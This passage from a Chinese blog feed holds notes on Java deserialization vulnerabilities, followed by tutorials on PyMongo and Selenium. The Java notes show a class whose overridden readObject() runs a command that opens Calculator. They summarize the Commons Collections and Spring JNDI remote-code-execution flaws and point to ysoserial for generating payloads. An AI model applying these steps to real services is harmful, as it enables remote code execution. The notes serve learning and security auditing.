os.writeObject(obj);</span><br><span class="line">    os.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件object.db中读取数据</span></span><br><span class="line">    FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.db"</span>);</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反序列化恢复对象obj</span></span><br><span class="line">    String obj2 = (String)ois.readObject();</span><br><span class="line">    ois.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-攻击方法"><a href="#2-攻击方法" class="headerlink" title="2 攻击方法:"></a>2 攻击方法:</h1><p>Java的某些库暴露或间接暴露反序列化API ，导致用户可以操作传入数据，两个或多个看似安全的模块在同一运行环境下，共同产生的安全问题，攻击者可以精心构造反序列化对象并执行恶意代码，主要方法是重写readObject()方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-经典漏洞："><a href="#3-经典漏洞：" class="headerlink" title="3 经典漏洞："></a>3 经典漏洞：</h1><ol><li>使用了有安全缺陷的Apache Commons Collections jar包 ,调用关系好复杂，Java渣渣看不明白 ，简单总结几句：</li></ol><ul><li><p>三个关键类：AnnotationInvocationHandler，TransformedMap.decorate，InvokerTransformer</p></li><li><p>Apache Commons Collections 序列化 RCE 漏洞问题主要出现在 org.apache.commons.collections.Transformer 接口上，<br>在 Apache Commons Collections 中有一个 InvokerTransformer 类实现了 Transformer 接口，主要作用是调用 Java 的反射机制来调用任意函数，只需要传入方法名、参数类型和参数，即可调用任意函数</p></li></ul><ol><li>2016 年的 Spring 框架的反序列化漏洞，该漏洞是利用了 RMI 以及 JNDI：</li></ol><ul><li>问题的关键点在JtaTransactionManager 类的 readObject() 方法，然后一大堆调用，反正其中有个函数lookup()使用了用户的可控输入属性：userTransactionName ， 攻击者构造userTransactionName就ok</li></ul><h1 id="4-利用工具："><a href="#4-利用工具：" class="headerlink" title="4 利用工具："></a>4 利用工具：</h1><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><h1 id="5-发现漏洞："><a href="#5-发现漏洞：" class="headerlink" title="5 发现漏洞："></a>5 发现漏洞：</h1><blockquote><p>1 首先拿到一个Java应用，需要找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用readObject来寻找，也可以直接通过对应用交互流量进行抓包，查看流量中是否包含java序列化数据来判断，java序列化数据的特征为以标记（ac ed 00 05）开头。</p><p>2 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库亦可），如果是，就可以使用ysoserial来生成反序列化的payload</p><p>3 从流量中发现序列化的痕迹，关键字：ac ed 00 05，rO0AB</p><p>4 Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是1099端口</p><p>5 从源码入手，可以被序列化的类一定实现了Serializable接口<br>观察反序列化时的readObject()方法是否重写，重写中是否有设计不合理，可以被利用之处</p></blockquote><p>Refer link:</p><ul><li>[<a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a>]</li><li>[<a href="http://www.cnblogs.com/alert123/p/5124637.html" target="_blank" rel="noopener">http://www.cnblogs.com/alert123/p/5124637.html</a>]</li><li>[<a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</a>]</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-什么是Java序列化和反序列化&quot;&gt;&lt;a href=&quot;#1-什么是Java序列化和反序列化&quot; class=&quot;headerlink&quot; title=&quot;1 什么是Java序列化和反序列化:&quot;&gt;&lt;/a&gt;1 什么是Java序列化和反序列化:&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p
      
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Python MongoDB学习笔记</title>
    <link href="http://yoursite.com/2018/01/23/Python-MongoDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/01/23/Python-MongoDB学习笔记/</id>
    <published>2018-01-23T14:51:08.000Z</published>
    <updated>2018-01-24T06:57:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-MongoDB-常用函数实例代码"><a href="#1-MongoDB-常用函数实例代码" class="headerlink" title="1 MongoDB 常用函数实例代码"></a>1 MongoDB 常用函数实例代码</h1><ol><li><p>连接 MongoDB 我们需要使用 PyMongo 库里面的 MongoClient，一般来说传入 MongoDB 的 IP 及端口即可，第一个参数为地址 host，第二个参数为端口 port，端口如果不传默认是 27017</p></li><li><p>MongoDB 中还分为一个个数据库，我们接下来的一步就是指定要操作哪个数据库，在这里我以 test 数据库为例进行说明，所以下一步我们需要在程序中指定要使用的数据库</p></li><li><p>MongoDB 的每个数据库又包含了许多集合 Collection，也就类似与关系型数据库中的表，下一步我们需要指定要操作的集合</p></li><li><p>在 MongoDB 中，每条数据其实都有一个 _id 属性来唯一标识，如果没有显式指明 _id，MongoDB 会自动产生一个 ObjectId 类型的 _id 属性。insert() 方法会在执行后返回的 _id 值</p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line">client = pymongo.MongoClient(host=<span class="string">'localhost'</span>, port=<span class="number">27017</span>) <span class="comment"># 链接数据库，得到数据库对象“client"</span></span><br><span class="line">db = client.test <span class="comment"># 新建或者选择”test“数据库</span></span><br><span class="line"><span class="comment"># db = client['test']</span></span><br><span class="line">collection = db.students <span class="comment"># 新建或者选择”students“ collection对象</span></span><br><span class="line"><span class="comment"># collection = db['students']</span></span><br><span class="line"></span><br><span class="line">student1 = &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'20170101'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'Jordan'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">'gender'</span>: <span class="string">'male'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">student2 = &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'20170202'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'Mike'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">21</span>,</span><br><span class="line">    <span class="string">'gender'</span>: <span class="string">'male'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># result = collection.insert(student) 官方不推荐用这个方法</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># result = collection.insert_one(student) # 对collection对象进行数据插入</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"><span class="comment"># print(result.inserted_id)</span></span><br><span class="line"></span><br><span class="line">result = collection.insert_many([student1, student2]) <span class="comment"># 对collection对象进行多个数据插入</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.inserted_ids)</span><br><span class="line"></span><br><span class="line">result = collection.find_one(&#123;<span class="string">'name'</span>: <span class="string">'Mike'</span>&#125;) <span class="comment"># 对collection对象进行查找</span></span><br><span class="line">print(type(result))</span><br><span class="line">print(result) <span class="comment"># 可以发现它多了一个 _id 属性，这就是 MongoDB 在插入的过</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-MongoDB-常用函数实例代码&quot;&gt;&lt;a href=&quot;#1-MongoDB-常用函数实例代码&quot; class=&quot;headerlink&quot; title=&quot;1 MongoDB 常用函数实例代码&quot;&gt;&lt;/a&gt;1 MongoDB 常用函数实例代码&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python Selenium库学习笔记</title>
    <link href="http://yoursite.com/2018/01/23/Python-Selenium%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/01/23/Python-Selenium库学习笔记/</id>
    <published>2018-01-23T14:50:49.000Z</published>
    <updated>2018-01-23T06:56:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-声明浏览器对象"><a href="#1-声明浏览器对象" class="headerlink" title="1 声明浏览器对象"></a>1 声明浏览器对象</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver </span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome() <span class="comment">#得到各类浏览器对象，当然需要先下载各类浏览器驱动</span></span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser = webdriver.Edge()</span><br><span class="line">browser = webdriver.PhantomJS()</span><br><span class="line">browser = webdriver.Safari()</span><br></pre></td></tr></table></figure><h1 id="2-访问页面"><a href="#2-访问页面" class="headerlink" title="2 访问页面"></a>2 访问页面</h1><p>用 get() 方法来请求一个网页，参数传入链接 URL 即可，比如在这里我们用 get() 方法访问淘宝，然后打印出源代码，代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)<span class="comment">#请求淘宝页面</span></span><br><span class="line">print(browser.page_source)<span class="comment">#得到网页源代码</span></span><br><span class="line">browser.close()<span class="comment">#浏览器关闭</span></span><br></pre></td></tr></table></figure><h1 id="3-查找节点"><a href="#3-查找节点" class="headerlink" title="3 查找节点"></a>3 查找节点</h1><p>用于填充表单、模拟点击等等，比如我们想要完成向某个输入框输入文字的操作，总得需要知道这个输入框在哪里吧？所以 Selenium 提供了一系列查找节点的方法，我们可以用这些方法来获取想要的节点，以便于下一步执行一些动作或者提取信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input_first = browser.find_element_by_id(<span class="string">'q'</span>) <span class="comment">#find_element_by_id()方法</span></span><br><span class="line">input_second = browser.find_element_by_css_selector(<span class="string">'#q'</span>)<span class="comment">#find_element_by_css_selector()方法</span></span><br><span class="line">input_third = browser.find_element_by_xpath(<span class="string">'//*[@id="q"]'</span>)<span class="comment">#find_element_by_xpath()方法</span></span><br><span class="line">print(input_first, input_second, input_third)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><p>列出所有获取单个节点的方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_element_by_id</span><br><span class="line">find_element_by_name</span><br><span class="line">find_element_by_xpath</span><br><span class="line">find_element_by_link_text</span><br><span class="line">find_element_by_partial_link_text</span><br><span class="line">find_element_by_tag_name</span><br><span class="line">find_element_by_class_name</span><br><span class="line">find_element_by_css_selector</span><br><span class="line"></span><br><span class="line">find_element_by_id(id) 就等价于 find_element(By.ID, id)，二者得到的结果完全一致。</span><br></pre></td></tr></table></figure><h1 id="4-查找多节点"><a href="#4-查找多节点" class="headerlink" title="4 查找多节点"></a>4 查找多节点</h1><p>用 find_elements() 这样的方法，方法名称中 element 多了一个 s ，注意区分，也就是说，上面列举的方法加“s”就能实现多节点查找<br>如果我们用 find_element() 方法，只能获取匹配的第一个节点，结果是 WebElement 类型，如果用 find_elements() 方法，<br>则结果是<strong>列表类型，列表的每个节点是 WebElement 类型</strong>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_elements_by_id</span><br><span class="line">find_elements_by_name</span><br><span class="line">find_elements_by_xpath</span><br><span class="line">find_elements_by_link_text</span><br><span class="line">find_elements_by_partial_link_text</span><br><span class="line">find_elements_by_tag_name</span><br><span class="line">find_elements_by_class_name</span><br><span class="line">find_elements_by_css_selector</span><br></pre></td></tr></table></figure><h1 id="5-节点交互"><a href="#5-节点交互" class="headerlink" title="5 节点交互"></a>5 节点交互</h1><p>Selenium 可以驱动浏览器来执行一些操作，也就是说我们可以让浏览器模拟执行一些动作，比较常见的用法有：<br>输入文字用 send_keys() 方法，清空文字用 clear() 方法，另外还有按钮点击，用 click() 方法。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()<span class="comment">#得到浏览器对象</span></span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)<span class="comment">#请求淘宝网</span></span><br><span class="line">input = browser.find_element_by_id(<span class="string">'q'</span>)<span class="comment">#查找id=q的元素，得到输入框&lt;input&gt;</span></span><br><span class="line">input.send_keys(<span class="string">'iPhone'</span>)<span class="comment">#调用send_keys()方法输入‘iPhone’</span></span><br><span class="line">time.sleep(<span class="number">1</span>)<span class="comment">#等待一秒</span></span><br><span class="line">input.clear()<span class="comment">#清空输入框</span></span><br><span class="line">input.send_keys(<span class="string">'iPad'</span>)<span class="comment">#再次输入新的字符串'iPad'</span></span><br><span class="line">button = browser.find_element_by_class_name(<span class="string">'btn-search'</span>)<span class="comment">#查找class为'btn-search'，得到button节点</span></span><br><span class="line">button.click()<span class="comment">#调用click()进行搜索</span></span><br></pre></td></tr></table></figure><h1 id="6-延时等待-显式等待"><a href="#6-延时等待-显式等待" class="headerlink" title="6 延时等待 - 显式等待"></a>6 延时等待 - 显式等待</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome() <span class="comment">#得到浏览器对象</span></span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com/'</span>) <span class="comment">#发出请求</span></span><br><span class="line">wait = WebDriverWait(browser, <span class="number">10</span>) <span class="comment">#得到WebDriverWait对象</span></span><br><span class="line">input = wait.until(EC.presence_of_element_located((By.ID, <span class="string">'q'</span>))) <span class="comment">#使用EC设置等待条件：等待id为q的元素加载</span></span><br><span class="line">button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="string">'.btn-search'</span>)))<span class="comment">#等待button按钮可以点击</span></span><br><span class="line">print(input, button)</span><br></pre></td></tr></table></figure><p>所以这样可以做到的效果就是，在 10 秒内如果 ID 为 q 的节点即搜索框成功加载出来了，那就返回该节点，如果超过10 秒还没有加载出来，那就抛出异常。<br>对于按钮，可以更改一下等待条件，比如改为 element_to_be_clickable，也就是可点击，所以查找按钮时是查找 CSS 选择器为 .btn-search 的按钮，如果 10 秒内它是可点击的也就是成功加载出来了，那就返回这个按钮节点，如果超过 10 秒还不可点击，也就是没有加载出来，那就抛出异常。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-声明浏览器对象&quot;&gt;&lt;a href=&quot;#1-声明浏览器对象&quot; class=&quot;headerlink&quot; title=&quot;1 声明浏览器对象&quot;&gt;&lt;/a&gt;1 声明浏览器对象&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
</feed>
